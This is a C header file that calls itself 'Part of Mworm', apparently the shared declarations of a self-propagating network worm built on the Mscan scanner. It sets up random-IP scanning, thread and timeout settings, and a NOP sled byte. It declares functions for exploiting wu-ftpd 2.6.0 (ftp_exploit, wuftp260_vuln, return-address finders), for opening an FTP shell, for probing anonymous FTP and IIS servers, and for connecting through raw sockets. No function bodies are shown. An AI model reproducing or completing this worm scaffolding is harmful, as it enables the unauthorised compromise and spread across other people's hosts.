   //common.h
   //Based on Mscan
   //Part of Mworm
   #include <stdio.h>
   #include <string.h>
   #include <stdlib.h>
   #include <errno.h>
   #include <signal.h>
   #include <sys/types.h>
   #include <netinet/in.h>
   #include <sys/socket.h>
   #include <sys/wait.h>
   #include <net/if.h>
   #include <netinet/in.h>
   #include <netdb.h>
   #include <rpc/rpc.h>
   #include <rpc/pmap_prot.h>
   #include <rpc/pmap_clnt.h>
   #include <unistd.h>
   #include <fcntl.h>
   #include <ctype.h>
   #include <signal.h>
   #include <sys/wait.h>
   #include <arpa/inet.h>
   #include <arpa/nameser.h>
   #include <getopt.h>
   #include <stdarg.h>
   #include <netinet/ip.h>
   //#include <netinet/tcp.h>
   #include <netinet/udp.h>
   #include <netinet/ip_icmp.h>
   #include <pthread.h>
   #include <thread_db.h>
   #include <sys/time.h>
   #include <sys/select.h>
   #include <sys/file.h>
   #include <sys/uio.h>
   #include <sys/ioctl.h>
   #include <ctype.h>

   //#define DEBUG  1      //if u  want to debug define it ,else not define it
   #define MAXHOST          255    //define the scale max  host number once scan
   #define SCANPORTNUM  11 //define the scan port type number
   #define MAXTHREAD    40     //define the thread num once time, default=10
   #define MIN_MULTI_NUM    1  //define the min of the multi, default = 1;
   #define CONNECT_TIME     4  //define the connect timeout , default=2;
   #define WEB_READTIMEOUT  4      //define the 80 socket read timeout , default=4
   #define WEB_WRITETIMEOUT 4      //define the 80 socket write timeout , default=4
   #define FTP_READTIMEOUT  4  //define the 21 socket read timeout, default=4
   #define FTP_WRITETIMEOUT 4  //define the 21 socket write timeout, default=4
   #define TELNET_READTIMEOUT 2    //define the 23 socket read timeout ,default=4
   #define TELNET_WRITETIMEOUT 2   //define the 23 socket write timeout ,default=4
   #define FINGER_WRITETIMEOUT 6   //define the finger timeout
   #define RPC_TIMEOUT  4      //define the create rpc timeout , default = 4
   #define BIND_TIMEOUT     4  //define the bind check timeout , default = 4
   #define CHECK_COUNT_M    6  //define the hole count when scan multi host, default=13
   #define CHECK_COUNT_S    6  //define all the check count ,if u add one type ,please modify it
   #define H_CONNECTING     1
   #define H_NONE       0
   #define H_TESTING    2
   #define H_DONE       3
   #define H_JOINED     4
   #define WU_FTP_260   1      //define the wu_ftp ver 2.60 type
   #define  LISTENQ        1       /* listen() backlog */
   #define max(a,b) ((a)>(b)?(a):(b))
   #define NOP 0x90


   struct host{
       char h_name[1024];
       unsigned long h_network;
       int h_port;
       int h_flags;
       int h_tid;
   }host[MAXHOST];

   int HostNumber;


   int daemon_init();
   void sig_chid(int signo);
   ssize_t writen(int fd,const void *vptr,size_t n);
   ssize_t readn(int fd,void *vptr,size_t n);
   static ssize_t my_read(int fd,char *ptr);
   ssize_t readline(int fd,void *vptr,size_t maxlen,int want_n);
   char * Get_localIP(int fd); //use getsockname to return the local ip address
   int TCP_listen(int port);
   int TCP_connect(char *Remote,int port);
   int TCP_NB_connect(unsigned long host_net,int port,int nsec);
   int UDP_NB_connect(unsigned long host_net,int port,int nsec);
   int readable_timeo(int fd, int sec);  //check if is readable , sec is the timeout time
                        //>0 express is readable

   int writeable_timeo(int fd, int sec);  //check if is writeable , sec is the timeout time
   char * create_randomIP();  //create a ip address, the last bit is 1
   void  net_write (int fd, const char *str, ...);  //thank 7350.c
   int Check_Anonymous_FTP(int fd );  //check if support anonymous ftp ,return 1 is ok
   int Check_Normal_FTP(int fd , char *Fname, char *Fpass );
                      //use Fname and Fpass land ftp server ,return 1 is ok
   char * HTStrCaseStr (char * s1, char * s2);  //no case as strstr
   char * Get_Range_Str (char * s, char * b, char * e);

   //in CheckCGI.c
   void Handle_Port_80(int fd, char *hostip,struct host *iptr);   //handle port 80
   char * Get_IIS_Title(int fd, char * hostip);                //Get the Host IIS first page Title

   //in CheckFTP.c
   int Handle_Port_21(int fd,char *hostip,struct host *iptr);  //Handle Ftp Scan
   int ftp_login(struct host *iptr);  //Login FTP server
   void FTP_shell (int sock);
   void ftp_recv_until (int sock, char *buff, int len, char *begin);
   unsigned long int ftp_finddist (int);
   int net_rlinet (int fd, char *buf, int bufsize, int sec);
   int net_rtimeout (int fd, int sec);
   unsigned long int ftp_findaddr (int ftpsock, struct host *iptr);
   void xpad_cat (unsigned char *fabuf, unsigned long int addr);
   unsigned long int ftp_finddaddr (int ftpsock, struct host *iptr);
   unsigned long int ftp_findrl (int ftpsock,unsigned long int retloc);
   void ftp_exploit (int ftpsock);
   int ftp_getwlen (int);
   int esc_ok (unsigned long int addr);
   int wuftp260_vuln (int ftpsock, char * hostip, struct host *iptr);
   int ftp_vuln (int ftpsock);
